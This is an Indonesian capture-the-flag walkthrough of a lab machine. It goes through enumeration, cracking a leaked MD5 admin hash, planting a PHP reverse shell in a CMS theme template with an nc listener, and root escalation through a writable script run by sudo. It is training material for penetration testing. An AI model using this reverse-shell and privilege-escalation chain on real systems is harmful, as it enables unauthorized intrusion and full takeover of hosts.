Scan dengan nmap seperti biasa `nmap -sV -sC 10.10.2.25 -oN zcan`

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

Selanjutnya kita enumerate direktori dengan `gobuster`.

```shell
gobuster dir -u http://10.10.2.25/content -w /usr/share/wordlists/dirb/small.txt | tee gobbed
```

kita hanya mendapat `/content`, untuk dapat tahu lebih jauh kita bisa enumerate lagi isi dari dir `/content` tersebut dengan gobuster

```shell
gobuster dir -u http://10.10.2.25/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobbed_content
```

hasilnya

```shell
...
/images               (Status: 301) [Size: 317] [--> http://10.10.2.25/content/images/]
/js                   (Status: 301) [Size: 313] [--> http://10.10.2.25/content/js/]
/inc                  (Status: 301) [Size: 314] [--> http://10.10.2.25/content/inc/]
/as                   (Status: 301) [Size: 313] [--> http://10.10.2.25/content/as/]
/_themes              (Status: 301) [Size: 318] [--> http://10.10.2.25/content/_themes/]
/attachment           (Status: 301) [Size: 321] [--> http://10.10.2.25/content/attachment/]
...
```

Kita dapat cek ke `/inc` dengan pergi ke `http://IP-TARGET/content/inc/`. Jika kita scroll, akan ada dir mysql backup, dan didalamnya terdapat file mysql. kita dapat coba cari `user` atau `admin` untuk mencari credentials. Disini untuk lebih memudahkan, kita dapat membukanya dengan text editor, dalam hal ini saya menggunakan Sublime. Buka file `subl mysql_backup_...sql`, lalu CTRL+F untuk mencari `user` atau `admin`. hasil yang didapat adalah seperti berikut (line 79).

```sql
\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\
```

Password disamarkan dengan hash, kita dapat cek jenis hash yang digunakan dengan `hashid`.

```shell
hashid "42f749ade7f9e195bf475f37a44cafcb"
...
Analyzing '42f749ade7f9e195bf475f37a44cafcb'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128)
...
```

Sepertinya, yang digunakan adalah MD5, kita dapat mencoba crack dengan hashcat

```shell
hashcat -a 0 -m 0 "42f749ade7f9e195bf475f37a44cafcb" /usr/share/wordlists/rockyou.txt
...
42f749ade7f9e195bf475f37a44cafcb:Password123
...
```

Jadi creds yang dapat digunakan adalah `manager:Password123`, selanjutnya kita dapat coba login ke `http://IP-TARGET/content/as/`. Setelah login ke dashboard admin, kita dapat setup revshell.

pergi ke tab `Theme` disebelah kiri, pada bagian dropdown `---`, pilih salah satu, dalam hal ini akan dipilih `Comment form template`, dan isi dengan revshell dari [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell). Jangan lupa untuk ganti `$ip` dan `$port` dengan tun0 atau IP LOCAL dan port pilihan. Selanjutnya kita setup listener `nc -lvnp PORT`, pastikan PORT sama dengan PORT yang ada di revshell script, lalu kita dapat pergi ke `http://IP-TARGET/content/_themes/default/comment_form.php`. Dan kita dapat revshell.

kita dapat cek user yang ada dalam target `ls /home/`, dan hasilnya `itguy`. Selanjutnya pindah ke dir `/home/itguy`, dan lakukan `ls -l`, akan ditemukan beberapa file menarik

```shell
-rw-r--r-x 1 root  root    47 nov 29  2019 backup.pl
...
-rw-rw-r-- 1 itguy itguy   16 nov 29  2019 mysql_login.txt
-rw-rw-r-- 1 itguy itguy   38 nov 29  2019 user.txt
```

`user.txt` merupakan flag user. Isi dari mysql_login.txt

```
cat mysql_login.txt
rice:randompass
```

Jika kita cek `sudo -l`, akan menghasilkan

```shell
...
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Isi dari `backup.pl` adalah

```perl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

Jadi file `backup.pl` ini akan menjalankan run file `/etc/copy.sh`. Kita dapat cek file permission dari file tersebut `ls -l /etc/copy.sh`, dan hasilnya kita dapat edit isi dari `copy.sh`.

Dari hasil investigasi sederhana tersebut, kita dapat memanfaatkan `/usr/bin/perl`, `backup.pl`, dan `/etc/copy.sh` untuk melakukan privesc.

Pertama kita perlu untuk edit isi dari `copy.sh` dengan

```shell
echo "/bin/bash" > /etc/copy.sh
```

Selanjutnya kita bisa run `backup.pl` dengan sudo

```shell
sudo /usr/bin/perl /home/itguy/backup.pl
```

Dan kita akan mendapatkan root shell. Root flag ada di `/root/root.txt`.